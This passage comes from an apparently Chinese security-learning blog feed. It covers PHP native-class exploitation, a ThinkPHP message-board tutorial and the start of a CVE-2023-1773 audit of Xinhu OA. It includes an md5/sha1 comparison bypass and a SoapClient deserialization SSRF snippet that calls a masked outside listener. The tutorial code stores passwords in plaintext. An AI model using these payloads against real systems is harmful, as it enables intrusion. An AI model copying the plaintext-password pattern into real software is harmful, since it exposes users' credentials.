class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Error: </span>payload in /usercode/file.php:2</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">Error: </span>payload in /usercode/file.php:2</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br></pre></td></tr></table></figure><p>在什么情况下会触发<code>__toString</code>呢？</p><ul><li><strong>使用<code>echo</code>或<code>print</code>直接输出对象</strong>：</li><li><strong>字符串插值</strong></li><li><strong>使用字符串连接操作符<code>.</code></strong></li><li><strong>显式地将对象转换为字符串</strong></li></ul><p><strong>任何需要将对象作为字符串处理的函数（例如 <code>md5()</code>、<code>sha1()</code> 等）都会触发对象的 <code>__toString()</code> 方法。</strong></p><p>那么可以利用这点绕过md5()和sha1()函数的比较，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )</span><br></pre></td></tr></table></figure><h1 id="0x03-使用-SoapClient-类进行-SSRF"><a href="#0x03-使用-SoapClient-类进行-SSRF" class="headerlink" title="0x03 使用 SoapClient 类进行 SSRF"></a>0x03 使用 SoapClient 类进行 SSRF</h1><p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p><p>SoapClient 类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。因此 SoapClient 类被广泛运用在 SSRF 中。</p><blockquote><p>该类的构造函数如下：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient <span class="type">:: SoapClient</span>(mixed $wsdl <span class="meta">[</span>，<span class="built_in">array</span> $options <span class="meta">]</span>)</span><br></pre></td></tr></table></figure><ul><li>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</li><li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</li></ul></blockquote><p>测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://47.xxx.xxx.72:2333/aaa&#x27;</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://47.xxx.xxx.72:2333&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里可以配合CRLF漏洞，在《CRLF入门》那篇文章里我没有提到，是因为没有测试成功。</p>]]></content>
      
      
      <categories>
          
          <category> PHP漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原生类利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初写ThinkPHP留言板</title>
      <link href="/2024/07/20/%E5%88%9D%E5%86%99ThinkPHP%E7%95%99%E8%A8%80%E6%9D%BF/"/>
      <url>/2024/07/20/%E5%88%9D%E5%86%99ThinkPHP%E7%95%99%E8%A8%80%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>安全的基础是开发。本次会详细讲解该项目的过程和心路。</p><h1 id="0X01-配置"><a href="#0X01-配置" class="headerlink" title="0X01 配置"></a>0X01 配置</h1><ol><li>本次在windows上安装<strong>ThinkPHP8.0稳定版</strong>，附上教程：</li></ol><p><a href="https://blog.csdn.net/weixin_62797596/article/details/134713455">https://blog.csdn.net/weixin_62797596/article/details/134713455</a></p><ol start="2"><li>将<code>.example.env</code>修改成<code>.env</code>，文件内容一并修改。</li></ol><h1 id="0x02-思路"><a href="#0x02-思路" class="headerlink" title="0x02 思路"></a>0x02 思路</h1><p><em><strong>本项目体量不大，但仍然尝试MVC模型。从控制层入手，具体的业务教给模型层，最后视图层呈现结果。</strong></em></p><ul><li>首先，留言版该实现什么功能呢？</li></ul><p>实现<strong>注册</strong>，<strong>登录</strong>，<strong>留言</strong>，<strong>注销</strong>四个功能。</p><ul><li>这些功能该对接哪些控制器呢？</li></ul><p>注册，登录，注销都属于用户操作，给<code>UsersController</code></p><p>看留言与写留言属于留言操作，给<code>MessagesController</code></p><ul><li>每一个表对应一个模型，该怎么制作表和模型层？</li></ul><p>本项目需要两个表：</p><p><code>users</code></p><table><thead><tr><th align="center">id</th><th align="center">username</th><th align="center">password</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">Pax</td><td align="center">123456</td></tr></tbody></table><p><code>messages</code></p><table><thead><tr><th align="center">id</th><th align="center">username</th><th align="center">messages</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">Pax</td><td align="center">FIag</td></tr></tbody></table><p>对应的两个模型层：<code>users.php</code>和<code>messages.php</code></p><p>对应的视图层文件用到再说。</p><h1 id="0x03-实现"><a href="#0x03-实现" class="headerlink" title="0x03 实现"></a>0x03 实现</h1><h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>在数据库（<code>mb</code>）里建表<code>users</code>并写入一行数据（如上表所示）。</p><p><code>.env</code>已经拉好配置了，数据库可以连上。</p><p><code>app-&gt;controller-&gt;users.php</code>文件写入<code>login()</code>方法：<br><img src="/./../images/image-20240721102340638.png" alt="image-20240721102340638"></p><p><code>app-&gt;common.php</code>文件里写入函数<code>post_xss</code></p><p><img src="/./../images/image-20240721102632660.png" alt="image-20240721102632660"></p><p>这里的<code>$users</code>是<code>model</code>的<code>users</code>的实例化</p><p><img src="/./../images/image-20240721102905277.png" alt="image-20240721102905277"></p><p><code>view-&gt;users-&gt;login.php</code>文件看看表单即可：</p><p><img src="/./../images/image-20240721103319847.png" alt="image-20240721103319847"></p><p>最后写入路由：</p><p><img src="/./../images/image-20240721103020287.png" alt="image-20240721103020287"></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><strong>控制器先写，模型层再实现，视图层展现，最后配上路由。</strong></p><h2 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h2><p>先写控制层：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">isPost</span>()) &#123;</span><br><span class="line">        <span class="comment">//XSS</span></span><br><span class="line">        <span class="variable">$data</span> = common\<span class="title function_ invoke__">post_xss</span>(<span class="variable">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;username&#x27;</span>), <span class="variable">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;password&#x27;</span>));</span><br><span class="line">        <span class="comment">//验证数据是否为空</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;信息输入不全&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">View</span>::<span class="title function_ invoke__">engine</span>(<span class="string">&#x27;php&#x27;</span>)-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;register&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$users</span> = <span class="keyword">new</span> <span class="title function_ invoke__">users</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$users</span>-&gt;<span class="title function_ invoke__">register</span>(<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>]);<span class="comment">//要return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">View</span>::<span class="title function_ invoke__">engine</span>(<span class="string">&#x27;php&#x27;</span>)-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;register&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再写模型层：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;已到达model的register&#x27;</span>;</span><br><span class="line">    <span class="comment">//判断是否存在用户</span></span><br><span class="line">    <span class="variable">$table</span> = <span class="title class_">Db</span>::<span class="title function_ invoke__">table</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&#x27;username&#x27;</span>, <span class="variable">$username</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$table</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;用户已存在&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">View</span>::<span class="title function_ invoke__">engine</span>(<span class="string">&#x27;php&#x27;</span>)-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;register&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$data</span> = [</span><br><span class="line">      <span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>,</span><br><span class="line">      <span class="string">&#x27;password&#x27;</span> =&gt; <span class="variable">$password</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="title class_">Db</span>::<span class="title function_ invoke__">name</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">insert</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;注册成功&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">View</span>::<span class="title function_ invoke__">engine</span>(<span class="string">&#x27;php&#x27;</span>)-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是视图层：</p><p><img src="/./../images/image-20240721103855795.png" alt="image-20240721103855795"></p><p>配路由按照上面格式即可</p><h2 id="留言"><a href="#留言" class="headerlink" title="留言"></a>留言</h2><p>给出控制层</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MessagesController</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title class_">Session</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">        <span class="variable">$password</span> = <span class="title class_">Session</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">            <span class="variable">$messages</span> = <span class="keyword">new</span> <span class="title function_ invoke__">messages</span>();</span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$messages</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;你是怎么进来的，hacker？&#x27;);&lt;/script&gt;&quot;</span>;;</span><br><span class="line">            <span class="title class_">View</span>::<span class="title function_ invoke__">engine</span>(<span class="string">&#x27;php&#x27;</span>)-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title class_">Session</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">        <span class="variable">$password</span> = <span class="title class_">Session</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">isPost</span>()) &#123;</span><br><span class="line">                <span class="variable">$messages</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;messages&#x27;</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$messages</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;留言不能为空&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> <span class="title class_">View</span>::<span class="title function_ invoke__">engine</span>(<span class="string">&#x27;php&#x27;</span>)-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;write&#x27;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$mess</span> = <span class="keyword">new</span> <span class="title function_ invoke__">messages</span>();</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$mess</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$username</span>, <span class="variable">$messages</span>);<span class="comment">//要return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title class_">View</span>::<span class="title function_ invoke__">engine</span>(<span class="string">&#x27;php&#x27;</span>)-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;write&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;你是怎么进来的，hacker？&#x27;);&lt;/script&gt;&quot;</span>;;</span><br><span class="line">                <span class="title class_">View</span>::<span class="title function_ invoke__">engine</span>(<span class="string">&#x27;php&#x27;</span>)-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再给出模型层</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">messages</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title class_">Db</span>::<span class="title function_ invoke__">table</span>(<span class="string">&#x27;messages&#x27;</span>)-&gt;<span class="title function_ invoke__">select</span>()-&gt;<span class="title function_ invoke__">order</span>(<span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;desc&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">View</span>::<span class="title function_ invoke__">engine</span>(<span class="string">&#x27;php&#x27;</span>)-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;show&#x27;</span>, [</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$data</span>,</span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$messages</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="title class_">Db</span>::<span class="title function_ invoke__">table</span>(<span class="string">&#x27;messages&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&#x27;username&#x27;</span>, <span class="variable">$username</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">        <span class="variable">$data</span> = [</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>,</span><br><span class="line">            <span class="string">&#x27;messages&#x27;</span> =&gt; <span class="variable">$messages</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="title class_">Db</span>::<span class="title function_ invoke__">name</span>(<span class="string">&#x27;messages&#x27;</span>)-&gt;<span class="title function_ invoke__">insert</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;留言成功&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">View</span>::<span class="title function_ invoke__">engine</span>(<span class="string">&#x27;php&#x27;</span>)-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;write&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>剩下自己解决，无非照猫画虎。</p><h2 id="注销"><a href="#注销" class="headerlink" title="注销"></a>注销</h2><p>删除session即可，不写，自己尝试。</p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>当那句话出来时，本篇文件就已结束：<strong>控制器先写， 模型层再实现，视图层展现，最后配上路由</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ThinkPHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2023-1773</title>
      <link href="/2024/07/11/CVE-2023-1773/"/>
      <url>/2024/07/11/CVE-2023-1773/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="代码审计之CVE-2023-1773"><a href="#代码审计之CVE-2023-1773" class="headerlink" title="代码审计之CVE-2023-1773"></a>代码审计之CVE-2023-1773</h1><p>参考文章：</p><ul><li><a href="https://blog.potatowo.top/2023/12/23/%E8%AE%B0%E4%B8%80%E6%AC%A1CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">保姆级教程</a></li><li><a href="https://mp.weixin.qq.com/s/25IpbhFLNcgEfiAC-vZltQ">进阶级教程</a></li></ul><p>[TOC]</p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>通过本次漏洞复现和代码审计，我应该掌握以下能力：</p><p>基础能力：</p><ul><li><p><input disabled="" type="checkbox"> 怎么<strong>高效地查看</strong>源码和<strong>获取信息</strong>.</p></li><li><p><input disabled="" type="checkbox"> 如何<strong>不断溯源代码</strong>以得到目的信息.</p></li><li><p><input disabled="" type="checkbox"> 对以<strong>面向对象</strong>为核心的项目的特点做一个总结.</p></li><li><p><input disabled="" type="checkbox"> <strong>怎么触发</strong>对应方法？如果在前端可控，又该<strong>怎么构造数据包</strong>？</p></li><li><p><input disabled="" type="checkbox"> 熟悉<strong>攻击链</strong>，明白攻击链每一环的<strong>条件和作用</strong>.</p></li><li><p><input disabled="" type="checkbox"> 掌握漏洞复现和代码审计的<strong>一般流程</strong>.</p></li></ul><p>进阶能力：</p><ul><li><p><input disabled="" type="checkbox"> 能<strong>独立审计</strong>一些简单的漏洞.</p></li><li><p><input disabled="" type="checkbox"> 掌握一些代码审计<strong>工具</strong>并用来解决漏洞.</p></li><li><p><input disabled="" type="checkbox"> 高阶目标：掌握<strong>项目框架</strong>.</p></li></ul><h2 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h2><blockquote><p>CVE-2023-1773</p><p>产品：信呼oa</p><p>影响版本：&lt;&#x3D;2.32</p><p>开源地址：<a href="https://github.com/rainrocka/xinhu/commits/master/">https://github.com/rainrocka/xinhu/commits/master/</a></p></blockquote><h2 id="0x02-入口分析"><a href="#0x02-入口分析" class="headerlink" title="0x02 入口分析"></a>0x02 入口分析</h2><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><p>本次从index.php入手，先放出代码：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711102100208.png" alt="image-20240711102100208"></p><p>对本段代码有以下问题：</p><ol><li>各个变量有什么用？</li><li>不认识这些方法.</li><li>这段代码的功能有哪些？</li><li>这段代码哪些地方可以被利用？</li></ol><p>我们一点一点看：</p><h4 id="get-方法溯源"><a href="#get-方法溯源" class="headerlink" title="get()方法溯源"></a>get()方法溯源</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_uurl</span>     = <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;rewriteurl&#x27;</span>);</span><br></pre></td></tr></table></figure><p>不认识<code>$rock-&gt;get(&#39;rewriteurl&#39;)</code>，那么我们不断溯源。</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711103002850.png" alt="image-20240711103002850"></p><p>这里面又有<code>isempt()</code>方法和<code>jmuncode()</code>方法不认识，但是从名字上可以窥见其功能一二。</p><p><em><strong>但是我们也要明白，项目往往会重写一些方法。同时，项目的方法是经过一层层封装的，越表层文件的方法往往被封装了很多次，需要我们不断溯源直至最底层的方法。</strong></em></p><p>先看看<code>isempt()</code>方法：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711103635340.png" alt="image-20240711103635340"></p><p>注释给出来了，就不需要继续溯源了——<em><strong>溯源的目的就是知道特定代码的作用</strong>。</em></p><p>再看看<code>jmuncode()</code>方法</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711103902949.png" alt="image-20240711103902949"></p><p>这段代码的作用给CHATGPT喂喂：对参数做一定的XSS过滤，转义单引号并去除空格。</p><p>总结一下<code>get()</code>方法的作用：<strong>获取GET传参中的值（第二个参数是默认值），并做了一定的xss过滤等处理，其中对单引号进行了转义，去除空格</strong>。</p><p>另外，<strong>get()方法是可控的</strong>。</p><h3 id="View-php"><a href="#View-php" class="headerlink" title="View.php"></a>View.php</h3><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>通过对网页的观察，我们开始怀疑$d，$m，$a等与GET参数有关，再大概扫几眼项目结构，怀疑这几个参数可以拼接路径。</p><p><em><strong>对前端和项目结构的信息搜集也是很重要的，换言之，我们要想办法在任何地方获取信息，而不是局限自身于项目源码。</strong></em></p><p>思考在哪些地方可以用到这些变量，进言之，哪个页面可以利用这些变量拼接目录。</p><p>View.php执行该功能，部分源码如下：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711110303020.png" alt="image-20240711110303020"></p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711110354053.png" alt="image-20240711110354053"></p><h4 id="gettoken-方法溯源过程（可跳）"><a href="#gettoken-方法溯源过程（可跳）" class="headerlink" title="gettoken()方法溯源过程（可跳）"></a>gettoken()方法溯源过程（可跳）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$ajaxbool</span>))<span class="variable">$ajaxbool</span> = <span class="variable">$rock</span>-&gt;jm-&gt;<span class="title function_ invoke__">gettoken</span>(<span class="string">&#x27;ajaxbool&#x27;</span>, <span class="string">&#x27;false&#x27;</span>);</span><br></pre></td></tr></table></figure><p>不知道<code>gettoken()</code>方法的作用，溯源<code>gettoken()</code>方法。下面详细讲讲溯源过程：</p><ol><li>要知道该方法的作用，ctrl+点击该方法，发现点不动。</li><li>点击<code>jm</code>，看看是否有该方法的声明或实现。发现没有。</li><li><code>jm</code>类没有，那么找上级<code>$rock</code>看看。也没有。</li><li>找<code>$rock</code>的上级看看，也没有。</li><li>上大招：ctrl+shift+f——全局搜索：function gettoken()，找到了：<code>jmChajian.php</code></li></ol><p><img src="/./../images/posts/CVE-2023-1773/image-20240711111821357.png" 